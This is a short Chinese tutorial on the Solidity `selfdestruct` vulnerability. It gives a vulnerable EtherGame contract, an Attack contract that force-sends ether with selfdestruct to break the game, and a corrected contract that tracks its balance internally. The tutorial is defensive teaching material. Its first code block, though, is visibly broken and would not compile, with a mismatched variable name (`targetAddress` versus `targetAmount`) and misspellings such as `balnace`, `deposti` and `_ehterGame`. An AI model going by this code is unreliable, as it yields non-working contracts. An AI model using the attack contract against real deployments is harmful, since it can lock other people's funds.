# 合约自毁漏洞

通过调用`selfdestruct`可以将从链上删除合约。

`selfdestruct`将剩下的eth发送到指定地址。



漏洞：

一个恶意的合约可以使用 `selfdestruct` 强制发送eth到任意地址

### 漏洞示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// game 合约的玩法是 成为第7位玩家
// 玩家可以一次存放 1 ether
// winner 可以提取所有的ether

/*
1. 部署 EtherGame
2. alice bob 决定参加游戏，每一次存入1 ether
3. 使用 EtherGame 地址部署 attack
4. 调用 attack 发送 5 eth。这会打破游戏， 没有人成为winner

发生了什么?
	强制EtherGame 的余额等于7.
	目前没有人能够存款， winner 不能够设置
*/
contract EtherGame {
	uint public targetAddress = 7 ether;
	address public winner;
	
	function deposti() public payable {
		require(msg.value == 1 ether, "You can only send 1 ether");
		
		uint balance = address(this).balance;
		require(balnace <= targetAmount, "Game is over");
		
		if (balance == targetAmount){
			winner = msg.sender;
		}
	}
	
	function claimReward() public {
		require(msg.sender == winner, "not winner");
		
		(bool sent, ) = msg.sender.call{value: address(this).balance}("");
		require(sent, "Failed to send ether");
	}
}

contract Attack {
	EtherGame etherGame;
	
	constructor(EtherGame _ehterGame) public payable {
		etherGame = _EtherGame(_etherGame);
	}
	
	function attack() public payable {
	    // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
	} 
}
```

### 预防技术

Don't rely on `address(this).balance`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
```

